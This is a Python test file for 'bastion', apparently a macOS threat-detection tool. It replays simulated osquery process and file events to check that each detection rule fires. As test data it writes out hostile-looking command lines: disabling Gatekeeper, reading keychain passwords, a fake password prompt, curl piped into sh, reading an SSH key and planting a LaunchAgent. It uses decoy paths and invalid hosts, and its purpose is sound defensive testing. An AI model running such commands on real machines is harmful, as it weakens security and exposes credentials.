"""The harmless triggers in scripts/test-triggers.sh must actually fire every rule.

This replays the same command lines and file operations the script performs (as osquery
would report them) and checks that each expected title is detected. If a rule changes so
the script no longer exercises it, this test fails before Colin runs the script.
"""

from __future__ import annotations

import re
from pathlib import Path

from conftest import exec_cols, oq

from bastion import cli
from bastion.collectors import RawRecord
from bastion.daemon import Pipeline
from bastion.detect.sigma import load_rules

SCRIPT = Path(__file__).resolve().parents[1] / "scripts" / "test-triggers.sh"
REPO = "/Users/colin/git/bastion"
D = f"{REPO}/build/decoys"
HOME = "/Users/colin"
ADHOC = "ADHOC"


def _exec(pipe, path, cmdline, pid, *, parent="100", flags=ADHOC):
    cols = exec_cols(path, cmdline, flags=flags, pid=pid)
    cols["parent"] = parent
    pipe.handle(RawRecord("osquery", oq("process_events", cols)))


def _file(pipe, proc, target, event_type, pid=900):
    pipe.handle(RawRecord("osquery", oq("file_events", {
        "pid": str(pid), "path": proc, "filename": target, "dest_filename": "",
        "event_type": event_type, "time": "1793480000"})))


def expected_titles() -> list[str]:
    text = SCRIPT.read_text()
    block = text[text.index("EXPECTED=("):text.index(")\n", text.index("EXPECTED=("))]
    titles = re.findall(r'"([^"]+)"', block)
    titles += re.findall(r'EXPECTED\+=\("([^"]+)"\)', text)
    return titles


def test_every_trigger_fires_its_rule(cfg, store):
    pipe = Pipeline(cfg, store)
    pid = iter(range(5000, 6000))
    cmds = [
        (f"{D}/spctl", f"{D}/spctl --master-disable"),
        (f"{D}/security", f"{D}/security find-generic-password -s bastion-test -w"),
        (f"{D}/osascript", f"{D}/osascript -e display dialog \"Bastion test\" default answer "
                           "\"\" with hidden answer"),
        (f"{D}/sysadminctl", f"{D}/sysadminctl -addUser bastiontest"),
        (f"{D}/tccutil", f"{D}/tccutil reset All com.bastiontest.decoy"),
        (f"{D}/xattr", f"{D}/xattr -d com.apple.quarantine /private/tmp/bastion-test-x"),
        (f"{D}/launchctl", f"{D}/launchctl bootout system/com.bastiontest.notreal"),
        ("/bin/sh", f"sh -c {D}/curl -s https://example.invalid | sh"),
        ("/private/tmp/bastion-test-1/payload", "/private/tmp/bastion-test-1/payload"),
        (f"{HOME}/.bastion-test/payload", f"{HOME}/.bastion-test/payload"),
        (f"{HOME}/Downloads/bastion-test-payload", f"{HOME}/Downloads/bastion-test-payload"),
    ]
    for path, cmd in cmds:
        _exec(pipe, path, cmd, next(pid))
    # typed `curl | sh`: two siblings with the script's shell (pid 777) as parent
    _exec(pipe, f"{D}/curl", f"{D}/curl -s https://example.invalid", next(pid), parent="777")
    _exec(pipe, "/bin/sh", "sh", next(pid), parent="777", flags="")
    # file rules
    _file(pipe, f"{D}/reader", f"{HOME}/.ssh/id_bastion_test", "open")
    _file(pipe, "/bin/bash", f"{HOME}/.zlogin", "create")
    plist = f"{HOME}/Library/LaunchAgents/com.bastiontest.decoy.plist"
    _file(pipe, "/bin/bash", plist, "create")
    pipe.handle(RawRecord("osquery", oq("launchd", {
        "path": plist, "label": "com.bastiontest.decoy", "program": ""}, counter=4)))

    got = {d["title"] for d in store.iter_detections()}
    missing = [t for t in expected_titles() if t not in got]
    assert not missing, missing


def test_script_expects_every_rule():
    rules, _ = load_rules(cli.Config().resolved_rules_dir())
    titles = set(expected_titles())
    assert {r.title for r in rules} <= titles
    assert "Download piped into a shell (interactive)" in titles
